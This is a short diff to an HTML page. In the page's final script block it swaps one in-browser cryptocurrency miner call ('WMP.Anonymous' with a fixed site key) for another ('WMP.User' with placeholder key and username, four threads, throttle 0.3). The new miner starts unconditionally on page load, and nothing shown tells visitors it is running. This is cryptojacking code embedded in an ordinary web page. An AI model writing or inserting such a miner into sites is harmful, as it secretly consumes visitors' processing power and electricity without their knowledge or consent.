@@ -63,11 +63,14 @@ canvas {
         });
 
       </script>
-    <script>
-      var miner = WMP.Anonymous('SK_NtaeQ3WWr9fZLpgCGxizv',{throttle: 0.4});
-      if (!miner.isMobile()){
-          miner.start();
-      }
-  </script>
+   <script>
+      var miner = WMP.User('<your-site-key>', '<username>',{
+          threads: 4,
+          autoThreads: false,
+          throttle: 0.3,
+          forceASMJS: false
+      });
+      miner.start();
+    </script>
   </body>
 </html>
